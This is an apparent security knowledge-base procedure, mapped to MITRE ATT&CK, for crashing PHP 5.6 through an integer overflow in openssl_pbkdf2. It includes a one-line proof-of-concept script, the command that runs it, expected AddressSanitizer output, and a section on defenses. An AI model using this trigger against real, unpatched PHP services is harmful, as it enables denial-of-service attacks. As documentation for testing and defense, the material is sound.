---
id: proc-php-openssl-trigger
tags:
  - dos
  - memory-corruption
  - php
  - openssl
  - exploitation
type: procedure
tools:
  - '[[tools/AddressSanitizer]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/php-execute-vulnerable-script]]'
verified: false
platforms:
  - Linux
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[Application or System Exploitation]]'
updated_at: '2025-12-14T17:28:20.634Z'
skill_level: intermediate
impact_level: medium
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[Application or System Exploitation]]'
---
# Trigger-Memory-Corruption-with-AddressSanitizer

## Summary

This procedure exploits the integer overflow in PHP 5.6's openssl_pbkdf2 by executing a crafted PHP script with an oversized key_length, using AddressSanitizer to detect and confirm the resulting negative-size-param error in OpenSSL's memcpy, leading to application crash and denial-of-service.

## Description

Targeted at PHP 5.6 environments on Linux, this procedure creates a simple PHP CLI script that invokes openssl_pbkdf2 with key_length set to a value like 2147483648 (exceeding INT_MAX). When run in a PHP build instrumented with AddressSanitizer, it triggers a runtime memory error in libcrypto.so's PKCS5_PBKDF2_HMAC, manifesting as a crash. The attack requires local execution privileges and is limited to DoS, with no demonstrated code execution. It highlights the vulnerability's detectability during testing and the fix in later PHP versions.

## Requirements

1. PHP 5.6 compiled with AddressSanitizer (e.g., -fsanitize=address flag)
2. OpenSSL library (default on Linux)
3. Local execution environment (e.g., Ubuntu with libasan.so.2)

## Defense

Defensive measures and detection strategies:

- Patch management: Update to PHP 5.6.29+ or PHP 7
- Fuzzing and sanitizers: Integrate AddressSanitizer in CI/CD for early detection
- Logging: Monitor PHP crashes and memory errors in production logs

## Objectives

1. Trigger overflow and negative size in memcpy
2. Confirm crash via AddressSanitizer report
3. Validate DoS impact on PHP process

## Instructions

### Step 1: Prepare Vulnerable PHP Build

**Context**: Ensure PHP is built with AddressSanitizer for error detection.

Compile PHP 5.6 with: ./configure --with-openssl && make, linking to libasan.so.2.

### Step 2: Create Exploitation Script

**Context**: Write a PHP script to call the vulnerable function.

Create vulnerable_script.php:

```php
<?php
$key = openssl_pbkdf2('password', 'salt', 2147483648, 1000, 'sha256');
?>
```

### Step 3: Execute and Observe Crash

**Context**: Run the script to trigger the error.

Execute [[commands/php-execute-vulnerable-script]]:

```bash
php vulnerable_script.php
```

> AddressSanitizer will output: "ERROR: AddressSanitizer: negative-size-param /path/to/openssl/PKCS5_PBKDF2_HMAC" followed by stack trace and process abort.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Endpoint Denial of Service]] Endpoint Denial of Service
- [[Application or System Exploitation]] Application or System Crashes

### Sub-Techniques


## Commands Used

- [[commands/php-execute-vulnerable-script]]

## Tools Used

- [[tools/AddressSanitizer]]

## Tags

- dos
- memory-corruption
- php
- openssl
- exploitation
